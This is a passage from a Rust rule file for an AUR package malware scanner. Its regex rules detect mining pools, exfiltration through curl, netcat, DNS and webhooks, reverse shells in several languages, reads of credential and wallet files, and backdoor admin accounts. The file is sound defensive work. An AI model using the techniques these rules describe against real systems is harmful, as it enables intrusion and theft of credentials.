            description: "Binary named like systemd component is suspicious. CHAOS RAT used 'systemd-initd'.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"systemd-[a-z]+d\b".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/usr/lib/systemd/systemd-".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify this is a legitimate systemd component".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Cryptomining
        // ============================================================
        Rule {
            id: "CRYPTO-001".to_string(),
            name: "Mining pool connection".to_string(),
            description: "Connection to cryptocurrency mining pools".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"stratum\+tcp://".to_string(),
                },
                Pattern::Regex {
                    pattern: r"pool\.(minergate|supportxmr|nanopool|hashvault|minexmr|f2pool)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRYPTO-002".to_string(),
            name: "Cryptominer binary".to_string(),
            description: "Known cryptocurrency miner executable names".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\b(xmrig|cgminer|bfgminer|cpuminer|minerd|ethminer|t-rex|lolminer|phoenixminer)\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove cryptomining components".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRYPTO-003".to_string(),
            name: "Monero/Bitcoin wallet address".to_string(),
            description: "Cryptocurrency wallet addresses indicate mining or theft".to_string(),
            severity: Severity::Critical,
            category: Category::Cryptomining,
            patterns: vec![
                // Monero addresses: 95 chars starting with 4, require context
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|monero|xmr)[^=]*4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"#.to_string(),
                },
                // Bitcoin addresses with context (avoid matching checksums)
                Pattern::Regex {
                    pattern: r#"(wallet|address|donate|payment|bitcoin|btc)[^=]*(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}"#.to_string(),
                },
                // Standalone wallet variables
                Pattern::Regex {
                    pattern: r#"(?i)(wallet|donate)_?(addr|address)?\s*=\s*['"]?[a-zA-Z0-9]{26,}"#.to_string(),
                },
                // Bare Monero address by format (no surrounding keyword needed):
                // a miner config can drop the address with no `wallet`/`xmr`
                // nearby. `(?-i)` keeps the Base58 classes case-exact despite the
                // engine's case-insensitive default. The 95-char shape is highly
                // specific, so false positives are negligible.
                Pattern::Regex {
                    pattern: r#"(?-i:\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b)"#.to_string(),
                },
                // Bare Bech32 Bitcoin address (`bc1...`). Legacy 1.../3...
                // addresses are left keyword-anchored above as they are far more
                // false-positive prone than the distinctive bc1 prefix.
                Pattern::Regex {
                    pattern: r#"(?-i:\bbc1[02-9ac-hj-np-z]{11,71}\b)"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Wallet addresses in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // CRITICAL: Data Exfiltration
        // ============================================================
        Rule {
            id: "EXFIL-001".to_string(),
            name: "Curl POST data exfiltration".to_string(),
            description: "Sending data to external servers via curl POST".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"curl\s+.*(-d|--data|--data-binary)\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"curl\s+.*-X\s+POST".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Build/install should not send data externally".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-002".to_string(),
            name: "Netcat data transfer".to_string(),
            description: "Using netcat to transfer data externally".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\|\s*nc\s+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"nc\s+[^\s]+\s+\d+\s*<".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Netcat should not be piping data in build scripts".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-003".to_string(),
            name: "Discord/Telegram webhook".to_string(),
            description: "Webhook URLs can be used for C2 communication or data exfiltration".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"discord(app)?\.com/api/webhooks/".to_string(),
                },
                Pattern::Regex {
                    pattern: r"api\.telegram\.org/bot".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Webhook URLs in packages are highly suspicious".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // HIGH: Obfuscation Techniques
        // ============================================================
        Rule {
            id: "OBF-001".to_string(),
            name: "Base64 decoding".to_string(),
            description: "Base64 decoding may hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"base64\s+(-d|--decode)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64\s+-[a-zA-Z]*d".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review the base64 content manually".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-002".to_string(),
            name: "Eval usage".to_string(),
            description: "Eval can execute obfuscated malicious code".to_string(),
            severity: Severity::High,
            category: Category::CommandInjection,
            patterns: vec![Pattern::Regex {
                pattern: r"\beval\s+".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Avoid eval; use direct commands instead".to_string(),
            cwe_id: Some("CWE-95".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-003".to_string(),
            name: "Hex-encoded payload".to_string(),
            description: "Hex encoding can hide malicious payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\\x[0-9a-fA-F]{2}".to_string(),
                },
                Pattern::Regex {
                    pattern: r"xxd\s+-r".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decode and review hex-encoded content".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-004".to_string(),
            name: "String concatenation obfuscation".to_string(),
            description: "Concatenating strings to hide commands".to_string(),
            severity: Severity::Medium,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r#"\$\{[a-z]\}.*\$\{[a-z]\}.*\$\{[a-z]\}"#.to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review concatenated strings carefully".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "OBF-005".to_string(),
            name: "Gzip decode execution".to_string(),
            description: "Decompressing and executing payloads".to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(gzip|gunzip|zcat)\s+.*\|\s*(ba)?sh".to_string(),
                },
                Pattern::Regex {
                    pattern: r"base64.*\|\s*(gzip|gunzip)\s+.*\|\s*(ba)?sh".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Decompress and review content before execution".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "OBF-006".to_string(),
            name: "Quote-splitting / character obfuscation".to_string(),
            description:
                "A command is assembled from adjacent single-character quoted fragments \
                 (e.g. \"b\"'u''n') or ANSI-C escapes to hide it from literal matching. \
                 This is almost exclusively a malware evasion technique; aur-scan also \
                 reports the decoded command via its other rules."
                    .to_string(),
            severity: Severity::High,
            category: Category::Obfuscation,
            patterns: vec![Pattern::Regex {
                pattern: QUOTE_SPLIT_PATTERN.to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation:
                "De-obfuscate the command and review what it actually runs.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // HIGH: Suspicious URLs and Sources
        // ============================================================
        Rule {
            id: "URL-001".to_string(),
            name: "Raw IP in URL".to_string(),
            description: "URLs with raw IP addresses are suspicious".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![Pattern::Regex {
                pattern: r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Use domain names from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "URL-002".to_string(),
            name: "URL shortener".to_string(),
            description: "URL shorteners can hide malicious destinations".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(bit\.ly|tinyurl|t\.co|goo\.gl|is\.gd|v\.gd|shorte\.st|adf\.ly)/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Always use full URLs from trusted sources".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "URL-003".to_string(),
            name: "Dynamic DNS domain".to_string(),
            description: "Dynamic DNS domains are often used for malware C2".to_string(),
            severity: Severity::High,
            category: Category::NetworkSecurity,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"\.(duckdns|no-ip|dynu|freedns|afraid)\.".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\.(ddns|hopto|zapto|sytes|serveftp)\.".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Dynamic DNS domains are suspicious in packages".to_string(),
            cwe_id: None,
            enabled: true,
        },
        // NOTE: insecure transport (git://, git+http://, http://, ftp://) and
        // weak checksums (md5/sha1) are intentionally NOT pattern rules. They
        // are owned by the source analyzer (SRC-001) and checksum analyzer
        // (CHK-002/CHK-003) respectively, which parse the source/checksum arrays
        // structurally. Keeping a single owner per concept keeps finding IDs
        // unique and auditable (see the `catalog` module).

        // ============================================================
        // HIGH: Hidden Files and Suspicious Paths
        // ============================================================
        Rule {
            id: "HIDDEN-001".to_string(),
            name: "Hidden file creation in home".to_string(),
            description: "Creating hidden files in user home directory".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.[^/]+".to_string(),
                },
                Pattern::Regex {
                    pattern: r"\$HOME/\.[^/]+".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not create hidden files in user home".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "HIDDEN-002".to_string(),
            name: "Tmp directory execution".to_string(),
            description: "Executing from /tmp is suspicious. CHAOS RAT placed binary in /tmp.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                // Executing FROM /tmp: a /tmp path in COMMAND position -- at the
                // start of a (logical) line, right after a command separator
                // (`;` `&` `|`), or as the target of an exec verb / interpreter.
                // This is the "execution" the rule is named for. It deliberately
                // does NOT match a /tmp path used as an assignment value or a
                // plain argument (`TMPDIR=/tmp/x`, `mktemp -d /tmp/x`, `cp foo
                // /tmp/x`, `> /tmp/x`), which are benign and were the source of
                // false positives (defect #10).
                Pattern::Regex {
                    pattern: format!(
                        r"(?:^|[;&|]|\b(?:exec|source|eval|{SHELLS}|python[23]?|perl|ruby|node|php)\s+)\s*\.?/tmp/\S+"
                    ),
                },
                Pattern::Regex {
                    pattern: r"chmod\s+\+x\s+/tmp/".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not execute from /tmp".to_string(),
            cwe_id: None,
            enabled: true,
        },
        Rule {
            id: "HIDDEN-003".to_string(),
            name: "Binary in non-standard location".to_string(),
            description: "Placing binaries in /usr/local/share or ~/.local/share. Used by CHAOS RAT.".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"(cp|mv|install).*(/usr/local/share|~/.local/share)/[^/]+\.(bin|elf|py|sh)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Binaries should be placed in standard locations".to_string(),
            cwe_id: None,
            enabled: true,
        },

        // ============================================================
        // HIGH: Environment Manipulation
        // ============================================================
        Rule {
            id: "ENV-001".to_string(),
            name: "LD_PRELOAD manipulation".to_string(),
            description: "LD_PRELOAD can be used to inject malicious libraries".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"LD_PRELOAD\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/ld\.so\.preload".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "LD_PRELOAD manipulation is extremely suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
        },
        Rule {
            id: "ENV-002".to_string(),
            name: "PATH manipulation".to_string(),
            description: "Modifying PATH to hijack commands".to_string(),
            severity: Severity::High,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"export\s+PATH\s*=".to_string(),
                },
                Pattern::Regex {
                    pattern: r#"PATH\s*=\s*["']?[^\$]"#.to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "PATH manipulation in install scripts is suspicious".to_string(),
            cwe_id: Some("CWE-426".to_string()),
            enabled: true,
        },
        Rule {
            id: "ENV-003".to_string(),
            name: "Bashrc/profile modification".to_string(),
            description: "Modifying shell config for persistence".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"~/\.(bashrc|bash_profile|profile|zshrc)".to_string(),
                },
                Pattern::Regex {
                    pattern: r"/etc/(bash\.bashrc|profile|zsh/)".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Packages should not modify shell configuration".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // INFO/LOW: Package Metadata Warnings
        // ============================================================
        Rule {
            id: "META-001".to_string(),
            name: "Provides impersonation".to_string(),
            description: "Package provides another package name, may be impersonating. CHAOS RAT used this technique.".to_string(),
            severity: Severity::Low,
            category: Category::SuspiciousMetadata,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"^provides=".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild],
            recommendation: "Verify this package is a legitimate alternative".to_string(),
            cwe_id: None,
            enabled: true,
        },

        // ============================================================
        // CRITICAL: "Atomic Arch" supply-chain campaign (June 2026)
        // Orphaned AUR packages were adopted and their PKGBUILD/install
        // hooks modified to pull malicious npm/bun packages
        // (atomic-lockfile, js-digest, lockfile-js) that drop a
        // credential stealer and an eBPF rootkit (scales.bpf.c).
        // ============================================================
        Rule {
            id: "ATOMIC-001".to_string(),
            name: "Atomic Arch malicious npm/bun package".to_string(),
            description: "References a known-malicious package from the June 2026 'Atomic Arch' AUR supply-chain campaign (atomic-lockfile, js-digest, lockfile-js). These pull an infostealer and eBPF rootkit during the build/install phase.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex {
                pattern: r"\b(atomic-lockfile|js-digest|lockfile-js)\b".to_string(),
            }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do NOT build. This is a known-malicious dependency. Remove the package and treat the host as compromised: rotate credentials (SSH, npm/GitHub tokens, browser sessions).".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },
        Rule {
            id: "ATOMIC-002".to_string(),
            name: "Node/Bun package manager in install hook".to_string(),
            description: "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                // `ci` installs the full lockfile (lifecycle scripts run);
                // `exec`/`dlx`/`rebuild` fetch-and-run or re-run lifecycle code.
                // The cross terms that don't exist as real subcommands (e.g.
                // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
                // folding them into one alternation is simpler without adding FPs.
                // `explore <pkg> -- cmd` runs an arbitrary command in a package
                // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                Pattern::Regex {
                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
                        .to_string(),
                },
                // `bun` subcommands (NOT `bunx`, which is the runner below — the
                // `\s+` after `bun` excludes `bunx`).
                Pattern::Regex {
                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
                },
                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
                // fetch and run a package directly (no subcommand) — the most
                // common fetch-and-run RCE, and the exact form the old
                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
                // missed. A bare runner followed by any argument is the attack.
                Pattern::Regex {
                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
                },
            ],
            file_types: vec![FileType::InstallScript],
            recommendation: "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.".to_string(),
            cwe_id: Some("CWE-494".to_string()),
            enabled: true,
        },
        Rule {
            id: "ATOMIC-003".to_string(),
            name: "eBPF rootkit / payload artifact".to_string(),
            description: "References the eBPF rootkit object (scales.bpf.c) or the 'deps' hook path used by the June 2026 'Atomic Arch' payload to gain rootkit-like capabilities and hide itself.".to_string(),
            severity: Severity::Critical,
            category: Category::Persistence,
            patterns: vec![
                Pattern::Regex {
                    pattern: r"scales\.bpf\.c".to_string(),
                },
                Pattern::Regex {
                    pattern: r"src/hooks/deps\b".to_string(),
                },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "This is a rootkit dropper artifact. Do not build; treat the host as compromised and reinstall rather than clean.".to_string(),
            cwe_id: Some("CWE-506".to_string()),
            enabled: true,
        },

        // ============================================================
        // PROACTIVE COVERAGE — additional reverse shells, exfil channels,
        // trust/auth tampering, and obfuscation, beyond the originally
        // reported samples. Each pattern is essentially never present in a
        // legitimate PKGBUILD; all inherit de-obfuscation + heredoc scoping.
        // ============================================================

        // --- reverse / bind shells (interpreters + fifo) ---
        Rule {
            id: "SHELL-005".to_string(),
            name: "Perl reverse shell".to_string(),
            description: "A Perl socket reverse shell (Socket + connect/exec).".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"perl\s+.*(socket|IO::Socket).*(connect|exec|/bin/sh)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-006".to_string(),
            name: "PHP reverse shell".to_string(),
            description: "A PHP reverse shell using fsockopen.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"php\s+-r\s+.*fsockopen".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-007".to_string(),
            name: "Ruby/Lua/AWK reverse shell".to_string(),
            description: "A reverse shell via Ruby TCPSocket, Lua socket, or AWK /inet/.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"ruby\s+.*(-rsocket|TCPSocket)".to_string() },
                Pattern::Regex { pattern: r"lua.*socket\.tcp\(".to_string() },
                Pattern::Regex { pattern: r"awk.*/inet/(tcp|udp)/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-008".to_string(),
            name: "Node.js reverse shell".to_string(),
            description: "A Node.js reverse shell using the net module.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r#"node\s+-e\s+.*require\(['"]net['"]\).*(connect|createConnection)"#.to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-009".to_string(),
            name: "OpenSSL-encrypted reverse shell".to_string(),
            description: "openssl s_client used as an encrypted C2 channel.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"openssl\s+s_client\s+.*-connect".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is an encrypted remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-010".to_string(),
            name: "Named-pipe (mkfifo) reverse shell".to_string(),
            description: "mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![Pattern::Regex { pattern: r"mkfifo\s+\S+.*(nc\s|ncat\s|openssl\s|/dev/(tcp|udp)/)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },
        Rule {
            id: "SHELL-011".to_string(),
            name: "Busybox/telnet/ncat-ssl shell".to_string(),
            description: "A reverse shell via busybox nc -e, telnet piped to a shell, or ncat --ssl -e.".to_string(),
            severity: Severity::Critical,
            category: Category::MaliciousCode,
            patterns: vec![
                Pattern::Regex { pattern: r"busybox\s+nc\b.*-e".to_string() },
                Pattern::Regex { pattern: r"telnet\s+\S+\s+\d{2,5}\s*\|".to_string() },
                Pattern::Regex { pattern: r"ncat\b.*--ssl.*-e".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This is a remote shell.".to_string(),
            cwe_id: Some("CWE-94".to_string()),
            enabled: true,
        },

        // --- exfiltration channels ---
        Rule {
            id: "EXFIL-004".to_string(),
            name: "DNS exfiltration".to_string(),
            description: "Data smuggled out via DNS lookups (dig/nslookup/host of a command-substituted subdomain, or a TXT query to an attacker domain).".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex { pattern: r"\b(dig|nslookup|host)\b\s+.*\$\(".to_string() },
                Pattern::Regex { pattern: r"\b(dig|nslookup)\b.*\b(TXT|@)\b".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the destination domain; this pattern smuggles data over DNS.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-006".to_string(),
            name: "HTTP upload exfiltration".to_string(),
            description: "curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"curl\s+.*(--upload-file|\s-T\s|--data-urlencode|\s-F\s)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify what is being uploaded and to where.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-007".to_string(),
            name: "wget POST exfiltration".to_string(),
            description: "wget --post-data/--post-file sending local data to a remote endpoint.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"wget\s+.*--post-(data|file)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify what is being posted and to where.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-008".to_string(),
            name: "Slack/Teams webhook exfiltration".to_string(),
            description: "Posting to a Slack or Microsoft Teams incoming webhook — a common low-friction exfil/C2 channel.".to_string(),
            severity: Severity::Critical,
            category: Category::DataExfiltration,
            patterns: vec![
                Pattern::Regex { pattern: r"hooks\.slack\.com/services/".to_string() },
                Pattern::Regex { pattern: r"webhook\.office\.com/webhookb2/".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove. Packages do not post to chat webhooks during build/install.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "EXFIL-009".to_string(),
            name: "Anonymous file-drop / tunnel host".to_string(),
            description: "Uploads to a throwaway file-drop or tunnels through ngrok/webhook.site/requestbin/IPFS — exfil and ad-hoc C2 endpoints.".to_string(),
            severity: Severity::High,
            category: Category::DataExfiltration,
            patterns: vec![Pattern::Regex { pattern: r"\b(file\.io|0x0\.st|transfer\.sh|oshi\.at|bashupload\.com|temp\.sh|ngrok\.(io|app|dev)|webhook\.site|requestbin\.(com|net)|pipedream\.net|ipfs\.io/api)\b".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Review the destination; these are common exfil/C2 hosts.".to_string(),
            cwe_id: Some("CWE-200".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-008".to_string(),
            name: "Environment/secret dump".to_string(),
            description: "Dumping the environment (env/printenv) to a file or pipe to curl/nc/base64 — harvests tokens and secrets exposed as env vars.".to_string(),
            severity: Severity::High,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"\b(env|printenv)\b\s*(\|\s*(curl|wget|nc|base64|gzip)|>\s*\S)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Remove. Packages have no reason to dump the environment.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // --- broadened credential-store targets ---
        Rule {
            id: "CRED-004".to_string(),
            name: "Cloud / CI credential file access".to_string(),
            description: "Reads cloud or CI credential files (gcloud, docker config, npmrc, pypirc, cargo/terraform credentials, git-credentials).".to_string(),
            severity: Severity::High,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"(\.git-credentials|\.config/gcloud|\.docker/config\.json|\.npmrc|\.pypirc|\.cargo/credentials|\.terraformrc|\.config/gh/hosts)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Verify why a build/install touches credential files.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },
        Rule {
            id: "CRED-005".to_string(),
            name: "Keyring / wallet access".to_string(),
            description: "Reads OS keyrings (gnome-keyring/kwallet/secret-tool) or crypto wallet files (electrum/bitcoin/metamask/keystore).".to_string(),
            severity: Severity::Critical,
            category: Category::CredentialTheft,
            patterns: vec![Pattern::Regex { pattern: r"(\.local/share/keyrings|\.local/share/kwalletd|secret-tool\s+search|kwallet-query|\.electrum|\.bitcoin/wallet|wallet\.dat|nkbihfbeogaeaoehlefnkodbefgpgknn)".to_string() }],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This harvests secrets/wallets.".to_string(),
            cwe_id: Some("CWE-522".to_string()),
            enabled: true,
        },

        // --- account / auth / system tampering ---
        Rule {
            id: "PRIV-007".to_string(),
            name: "Privileged account manipulation".to_string(),
            description: "Creates or elevates an account to uid 0 / the wheel or sudo group — a backdoor-admin pattern.".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                // uid/gid 0, or the -o/--non-unique flag (incl. combined like -ou).
                Pattern::Regex { pattern: r"\b(useradd|usermod)\b.*((-u|--uid)[= ]*0\b|-g[= ]*0\b|\s-\w*o\w*\b|--non-unique)".to_string() },
                // adding/creating an account in the wheel or sudo group.
                Pattern::Regex { pattern: r"\b(useradd|usermod|adduser)\b.*\b(wheel|sudo)\b".to_string() },
                Pattern::Regex { pattern: r"\bgpasswd\s+-a\s+\S+\s+(wheel|sudo)".to_string() },
            ],
            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
            recommendation: "Do not build. This grants an account administrative access.".to_string(),
            cwe_id: Some("CWE-269".to_string()),
            enabled: true,
        },
        Rule {
            id: "PRIV-008".to_string(),
            name: "Password manipulation".to_string(),
            description: "Sets, resets, or clears an account password (chpasswd / passwd -d / piped passwd).".to_string(),
            severity: Severity::Critical,
            category: Category::PrivilegeEscalation,
            patterns: vec![
                Pattern::Regex { pattern: r"\bchpasswd\b".to_string() },
